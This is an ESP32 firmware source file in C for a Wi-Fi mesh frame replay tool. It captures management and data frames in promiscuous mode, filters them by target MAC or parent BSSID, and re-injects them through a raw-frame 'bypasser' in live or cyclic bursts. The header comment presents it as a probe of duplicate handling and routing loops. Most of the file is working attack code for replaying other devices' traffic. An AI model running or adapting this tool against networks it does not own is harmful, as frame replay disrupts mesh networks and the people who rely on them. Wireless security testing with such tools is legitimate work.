/**
 * mesh_replay.c
 *
 * Captures mesh/management frames in promiscuous mode and re-transmits them
 * to probe duplicate handling, routing loops, and mesh-state confusion.
 */

#include "mesh_replay.h"

#include <string.h>
#include <stdio.h>

#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_netif.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "MESH_REPLAY";

static const char *filter_strings[] = {
    [MESH_REPLAY_FILTER_ALL]         = "All Frames",
    [MESH_REPLAY_FILTER_MGMT]        = "Management",
    [MESH_REPLAY_FILTER_DATA]        = "Data",
    [MESH_REPLAY_FILTER_MESH_ACTION] = "Mesh Action",
};

static const char *mode_strings[] = {
    [MESH_REPLAY_MODE_LIVE]  = "Live Replay",
    [MESH_REPLAY_MODE_CYCLE] = "Cycle Replay",
};

static mesh_replay_state_t  s_state;
static mesh_replay_config_t s_cfg;
static mesh_replay_frame_t  s_store[MESH_REPLAY_MAX_STORED];
static volatile bool        s_running = false;
static TaskHandle_t         s_task = NULL;
static esp_timer_handle_t   s_timeout_timer = NULL;
static SemaphoreHandle_t    s_mutex = NULL;
static bool                 s_ap_was_stopped = false;
static wifi_config_t        s_saved_ap;
static int64_t              s_start_us = 0;
static volatile uint16_t    s_pending_live = 0;

const char *mesh_replay_filter_str(mesh_replay_filter_t f)
{
    if (f >= MESH_REPLAY_FILTER_COUNT) return "Unknown";
    return filter_strings[f];
}

const char *mesh_replay_mode_str(mesh_replay_mode_t m)
{
    if (m >= MESH_REPLAY_MODE_COUNT) return "Unknown";
    return mode_strings[m];
}

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

static void mac_to_str(const uint8_t *mac, char *out, size_t out_sz)
{
    snprintf(out, out_sz, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void payload_to_hex(const uint8_t *data, uint16_t len, char *out, size_t out_sz)
{
    if (!data || !out || out_sz < 3) {
        if (out && out_sz) out[0] = '\0';
        return;
    }
    size_t max_bytes = (out_sz - 1) / 2;
    if (len > max_bytes) len = (uint16_t)max_bytes;
    for (uint16_t i = 0; i < len; i++) {
        snprintf(out + i * 2, 3, "%02x", data[i]);
    }
    out[len * 2] = '\0';
}

static bool mac_matches_filter(const uint8_t *a, const uint8_t *b)
{
    return memcmp(a, b, 6) == 0;
}

static bool frame_involves_mac(const uint8_t *addr1, const uint8_t *addr2,
                               const uint8_t *addr3, const uint8_t *target)
{
    return mac_matches_filter(addr1, target) ||
           mac_matches_filter(addr2, target) ||
           mac_matches_filter(addr3, target);
}

static bool is_mesh_vendor_action(const uint8_t *f, uint16_t sig_len, uint8_t subtype)
{
    if (subtype != 13 || sig_len < 32) return false;
    return f[26] == 0xE0 && f[27] == 0x9A && f[28] == 0xF6;
}

static bool passes_filter(wifi_promiscuous_pkt_type_t type,
                          const uint8_t *f, uint16_t sig_len,
                          uint8_t subtype, bool *is_mesh_action)
{
    *is_mesh_action = false;

    if (type == WIFI_PKT_MGMT) {
        if (s_cfg.filter == MESH_REPLAY_FILTER_DATA) {
            return false;
        }
        if (s_cfg.filter == MESH_REPLAY_FILTER_MESH_ACTION) {
            if (!is_mesh_vendor_action(f, sig_len, subtype)) {
                return false;
            }
            *is_mesh_action = true;
        }
        return true;
    }

    if (type == WIFI_PKT_DATA) {
        if (s_cfg.filter == MESH_REPLAY_FILTER_MGMT ||
            s_cfg.filter == MESH_REPLAY_FILTER_MESH_ACTION) {
            return false;
        }
        return true;
    }

    return false;
}

static void extract_addrs(wifi_promiscuous_pkt_type_t type, const uint8_t *f,
                          uint8_t addr1[6], uint8_t addr2[6], uint8_t addr3[6],
                          uint8_t *ftype, bool is_mesh_action)
{
    if (type == WIFI_PKT_MGMT) {
        *ftype = is_mesh_action ? 2 : 0;
        memcpy(addr1, f + 4, 6);
        memcpy(addr2, f + 10, 6);
        memcpy(addr3, f + 16, 6);
    } else {
        *ftype = 1;
        memcpy(addr1, f + 4, 6);
        memcpy(addr2, f + 10, 6);
        memcpy(addr3, f + 16, 6);
    }
}

static void append_log(uint8_t ftype, uint8_t subtype,
                       const uint8_t *addr1, const uint8_t *addr2, const uint8_t *addr3,
                       const uint8_t *f, uint16_t sig_len, int8_t rssi,
                       bool replayed, bool tx_ok)
{
    if (s_state.log_count >= MESH_REPLAY_MAX_LOG) return;

    mesh_replay_log_t entry;
    memset(&entry, 0, sizeof(entry));
    entry.time_ms    = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
    entry.frame_type = ftype;
    entry.subtype    = subtype;
    memcpy(entry.src_mac, addr2, 6);
    memcpy(entry.dst_mac, addr1, 6);
    memcpy(entry.bssid, addr3, 6);
    entry.rssi     = rssi;
    entry.len      = sig_len;
    entry.replayed = replayed;
    entry.tx_ok    = tx_ok;

    uint16_t hdr_len = 24;
    if (ftype == 1 && (f[0] & 0x8C) == 0x88) {
        hdr_len = 26;
    }
    uint16_t pay_total = 0;
    if (sig_len > hdr_len) {
        pay_total = (uint16_t)(sig_len - hdr_len);
        if (pay_total > MESH_REPLAY_PAYLOAD_LOG_MAX) {
            pay_total = MESH_REPLAY_PAYLOAD_LOG_MAX;
        }
        memcpy(entry.payload, f + hdr_len, pay_total);
    }
    entry.payload_len = pay_total;
    s_state.log[s_state.log_count++] = entry;
}

static bool store_frame(const uint8_t *f, uint16_t len, uint8_t ftype, uint8_t subtype,
                        const uint8_t *addr1, const uint8_t *addr2, const uint8_t *addr3,
                        int8_t rssi)
{
    if (len == 0 || len > MESH_REPLAY_FRAME_MAX) return false;

    uint32_t idx = s_state.stored_count;
    if (idx >= MESH_REPLAY_MAX_STORED) {
        idx = idx % MESH_REPLAY_MAX_STORED;
    } else {
        s_state.stored_count++;
    }

    mesh_replay_frame_t *slot = &s_store[idx];
    slot->len = len;
    memcpy(slot->data, f, len);
    slot->captured_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
    slot->frame_type  = ftype;
    slot->subtype     = subtype;
    memcpy(slot->src_mac, addr2, 6);
    memcpy(slot->dst_mac, addr1, 6);
    memcpy(slot->bssid, addr3, 6);
    slot->rssi = rssi;
    return true;
}

static bool tx_frame(const uint8_t *frame, uint16_t len)
{
    if (!frame || len < 24) return false;
    return wsl_bypasser_send_raw_frame(frame, len);
}

static void replay_one(const mesh_replay_frame_t *slot)
{
    if (!slot || slot->len < 24) return;

    uint8_t reps = s_cfg.replay_per_frame > 0 ? s_cfg.replay_per_frame : 1;
    bool any_ok = false;

    for (uint8_t i = 0; i < reps; i++) {
        bool ok = tx_frame(slot->data, slot->len);
        s_state.frames_replayed++;
        if (ok) {
            s_state.replay_ok++;
            any_ok = true;
        } else {
            s_state.replay_failed++;
        }
        if (reps > 1 && i + 1 < reps) {
            vTaskDelay(pdMS_TO_TICKS(2));
        }
    }

    append_log(slot->frame_type, slot->subtype,
               slot->dst_mac, slot->src_mac, slot->bssid,
               slot->data, slot->len, slot->rssi, true, any_ok);
}

static void IRAM_ATTR replay_capture_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || !s_state.capturing) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *f = pkt->payload;
    uint16_t sig_len = (uint16_t)pkt->rx_ctrl.sig_len;
    if (sig_len < 24) return;

    if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
        s_state.frames_seen++;
    } else {
        return;
    }

    uint8_t subtype = (f[0] >> 4) & 0x0F;
    bool is_mesh_action = false;
    if (!passes_filter(type, f, sig_len, subtype, &is_mesh_action)) {
        return;
    }

    uint8_t addr1[6], addr2[6], addr3[6], ftype = 0;
    extract_addrs(type, f, addr1, addr2, addr3, &ftype, is_mesh_action);

    if (s_cfg.parent_bssid_set &&
        !frame_involves_mac(addr1, addr2, addr3, s_cfg.parent_bssid)) {
        return;
    }
    if (s_cfg.target_mac_set &&
        !frame_involves_mac(addr1, addr2, addr3, s_cfg.target_mac)) {
        return;
    }

    s_state.frames_captured++;
    s_state.rssi = pkt->rx_ctrl.rssi;

    if (mutex_take()) {
        store_frame(f, sig_len, ftype, subtype, addr1, addr2, addr3, pkt->rx_ctrl.rssi);
        if (s_cfg.mode == MESH_REPLAY_MODE_LIVE) {
            s_pending_live++;
        } else {
            append_log(ftype, subtype, addr1, addr2, addr3, f, sig_len,
                       pkt->rx_ctrl.rssi, false, false);
        }
        mutex_give();
    }
}

static bool prepare_radio(void)
{
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);

    if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
        esp_wifi_get_config(WIFI_IF_AP, &s_saved_ap);
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    wifi_config_t empty_sta = {0};
    esp_wifi_set_config(WIFI_IF_STA, &empty_sta);
    esp_wifi_disconnect();

    uint8_t ch = s_cfg.channel > 0 ? s_cfg.channel : 6;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    s_state.channel = ch;
    return true;
}

static void restore_radio(void)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    vTaskDelay(pdMS_TO_TICKS(100));

    if (s_ap_was_stopped) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        esp_wifi_set_config(WIFI_IF_AP, &s_saved_ap);
        esp_wifi_start();
        wifictl_mgmt_ap_start();

        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_dhcps_stop(ap_netif);
            vTaskDelay(pdMS_TO_TICKS(50));
            esp_netif_dhcps_start(ap_netif);
        }
        s_ap_was_stopped = false;
    }

    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "Replay timeout (%d s)", MESH_REPLAY_TIMEOUT_SEC);
    s_state.timeout = true;
    s_running = false;
}

static void start_timeout_timer(void)
{
    stop_timeout_timer();
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "mesh_replay_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, MESH_REPLAY_TIMEOUT_US);
    }
}

static void drain_live_pending(void)
{
    if (s_cfg.mode != MESH_REPLAY_MODE_LIVE || s_pending_live == 0) return;
    if (!mutex_take()) return;

    uint32_t count = s_state.stored_count;
    if (count == 0) {
        s_pending_live = 0;
        mutex_give();
        return;
    }

    uint32_t start = (count > MESH_REPLAY_MAX_STORED)
        ? (count - MESH_REPLAY_MAX_STORED) : 0;
    uint32_t pending = s_pending_live;
    s_pending_live = 0;

    for (uint32_t i = 0; i < pending && i < count; i++) {
        uint32_t idx = (start + count - 1 - i) % MESH_REPLAY_MAX_STORED;
        replay_one(&s_store[idx]);
    }

    s_state.replaying = true;
    mutex_give();
}

static void cycle_replay(void)
{
    if (s_cfg.mode != MESH_REPLAY_MODE_CYCLE) return;
    if (!mutex_take()) return;

    uint32_t count = s_state.stored_count;
    if (count == 0) {
        mutex_give();
        return;
    }
    if (count > MESH_REPLAY_MAX_STORED) {
        count = MESH_REPLAY_MAX_STORED;
    }

    s_state.replaying = true;
    for (uint32_t i = 0; i < count && s_running; i++) {
        replay_one(&s_store[i]);
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    mutex_give();
}

static void replay_task(void *arg)
{
    (void)arg;
    s_start_us = esp_timer_get_time();

    ESP_LOGW(TAG, "═══ MESH REPLAY START ═══ ch=%u mode=%s filter=%s",
             s_cfg.channel,
             mesh_replay_mode_str(s_cfg.mode),
             mesh_replay_filter_str(s_cfg.filter));

    if (!prepare_radio()) {
        snprintf(s_state.error, sizeof(s_state.error), "Radio prepare failed");
        ESP_LOGE(TAG, "%s", s_state.error);
        goto done;
    }

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(replay_capture_cb);
    esp_wifi_set_promiscuous(true);
    s_state.capturing = true;

    uint32_t loops = 0;
    uint32_t cycle_ms = s_cfg.replay_interval_ms > 0 ? s_cfg.replay_interval_ms : 200;
    int64_t last_cycle_us = esp_timer_get_time();

    while (s_running) {
        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
        loops++;

        drain_live_pending();

        if (s_cfg.mode == MESH_REPLAY_MODE_CYCLE) {
            int64_t now = esp_timer_get_time();
            if ((now - last_cycle_us) >= (int64_t)cycle_ms * 1000) {
                cycle_replay();
                last_cycle_us = now;
            }
        }

        if ((loops % 10) == 0) {
            ESP_LOGI(TAG, "replay ch=%u cap=%lu replay=%lu ok=%lu fail=%lu stored=%lu",
                     s_state.channel,
                     (unsigned long)s_state.frames_captured,
                     (unsigned long)s_state.frames_replayed,
                     (unsigned long)s_state.replay_ok,
                     (unsigned long)s_state.replay_failed,
                     (unsigned long)s_state.stored_count);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

done:
    s_state.capturing = false;
    s_state.replaying = false;
    s_state.active = false;
    s_running = false;
    stop_timeout_timer();
    restore_radio();
    ESP_LOGW(TAG, "═══ MESH REPLAY STOP ═══ cap=%lu replay=%lu timeout=%d",
             (unsigned long)s_state.frames_captured,
             (unsigned long)s_state.frames_replayed,
             (int)s_state.timeout);
    s_task = NULL;
    vTaskDelete(NULL);
}

void mesh_replay_init(void)
{
    memset(&s_state, 0, sizeof(s_state));
    memset(s_store, 0, sizeof(s_store));
    s_running = false;
    s_pending_live = 0;
    ESP_LOGI(TAG, "Mesh replay ready");
}

esp_err_t mesh_replay_start(const mesh_replay_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;
    if (cfg->channel == 0) return ESP_ERR_INVALID_ARG;
    if (cfg->filter >= MESH_REPLAY_FILTER_COUNT) return ESP_ERR_INVALID_ARG;
    if (cfg->mode >= MESH_REPLAY_MODE_COUNT) return ESP_ERR_INVALID_ARG;

    memset(&s_state, 0, sizeof(s_state));
    memset(s_store, 0, sizeof(s_store));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    if (s_cfg.replay_interval_ms == 0) {
        s_cfg.replay_interval_ms = 200;
    }
    if (s_cfg.replay_per_frame == 0) {
        s_cfg.replay_per_frame = 1;
    }

    s_state.active = true;
    s_state.filter = s_cfg.filter;
    s_state.mode   = s_cfg.mode;
    s_state.channel = s_cfg.channel;
    strncpy(s_state.ssid, s_cfg.ssid, sizeof(s_state.ssid) - 1);
    strncpy(s_state.filter_str, mesh_replay_filter_str(s_cfg.filter),
            sizeof(s_state.filter_str) - 1);
    strncpy(s_state.mode_str, mesh_replay_mode_str(s_cfg.mode),
            sizeof(s_state.mode_str) - 1);

    if (s_cfg.parent_bssid_set) {
        memcpy(s_state.parent_bssid, s_cfg.parent_bssid, 6);
    }
    if (s_cfg.target_mac_set) {
        memcpy(s_state.target_mac, s_cfg.target_mac, 6);
    }

    s_pending_live = 0;
    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(replay_task, "mesh_replay", 6144, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        return ESP_ERR_NO_MEM;
    }

    return ESP_OK;
}

esp_err_t mesh_replay_stop(void)
{
    if (!s_running && !s_state.active) {
        restore_radio();
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 30;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (s_state.active) {
        restore_radio();
        s_state.active = false;
        s_state.capturing = false;
        s_state.replaying = false;
    }

    return ESP_OK;
}

bool mesh_replay_is_active(void)
{
    return s_running || s_state.active;
}

const mesh_replay_state_t *mesh_replay_get_state(void)
{
    return &s_state;
}

cJSON *mesh_replay_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const mesh_replay_state_t *st = &s_state;
    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "capturing", st->capturing);
    cJSON_AddBoolToObject(root, "replaying", st->replaying);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "frames_captured", st->frames_captured);
    cJSON_AddNumberToObject(root, "frames_seen", st->frames_seen);
    cJSON_AddNumberToObject(root, "frames_replayed", st->frames_replayed);
    cJSON_AddNumberToObject(root, "replay_ok", st->replay_ok);
    cJSON_AddNumberToObject(root, "replay_failed", st->replay_failed);
    cJSON_AddNumberToObject(root, "stored_count", st->stored_count);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "channel", st->channel);
    cJSON_AddNumberToObject(root, "rssi", st->rssi);
    cJSON_AddNumberToObject(root, "filter", st->filter);
    cJSON_AddNumberToObject(root, "mode", st->mode);
    cJSON_AddStringToObject(root, "filter_str", st->filter_str);
    cJSON_AddStringToObject(root, "mode_str", st->mode_str);
    cJSON_AddStringToObject(root, "ssid", st->ssid);
    cJSON_AddNumberToObject(root, "log_count", st->log_count);

    char buf[18];
    mac_to_str(st->parent_bssid, buf, sizeof(buf));
    cJSON_AddStringToObject(root, "parent_bssid", buf);
    mac_to_str(st->target_mac, buf, sizeof(buf));
    cJSON_AddStringToObject(root, "target_mac", buf);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running) ?
            (st->replaying ? "Replaying" :
             (st->capturing ? "Capturing" : "Preparing")) :
            (st->timeout ? "Timeout" : "Idle"));

    cJSON *logs = cJSON_CreateArray();
    for (int i = 0; i < st->log_count; i++) {
        const mesh_replay_log_t *e = &st->log[i];
        cJSON *item = cJSON_CreateObject();
        const char *type_str = e->frame_type == 2 ? "MESH" :
                               e->frame_type == 1 ? "DATA" : "MGMT";
        cJSON_AddStringToObject(item, "type", type_str);
        cJSON_AddNumberToObject(item, "subtype", e->subtype);
        cJSON_AddNumberToObject(item, "rssi", e->rssi);
        cJSON_AddNumberToObject(item, "time_ms", e->time_ms);
        cJSON_AddNumberToObject(item, "len", e->len);
        cJSON_AddBoolToObject(item, "replayed", e->replayed);
        cJSON_AddBoolToObject(item, "tx_ok", e->tx_ok);

        mac_to_str(e->src_mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "src_mac", buf);
        mac_to_str(e->dst_mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "dst_mac", buf);
        mac_to_str(e->bssid, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "bssid", buf);

        char hex[MESH_REPLAY_PAYLOAD_LOG_MAX * 2 + 1];
        payload_to_hex(e->payload, e->payload_len, hex, sizeof(hex));
        cJSON_AddStringToObject(item, "payload", hex);
        cJSON_AddNumberToObject(item, "payload_len", e->payload_len);
        cJSON_AddItemToArray(logs, item);
    }
    cJSON_AddItemToObject(root, "logs", logs);

    return root;
}
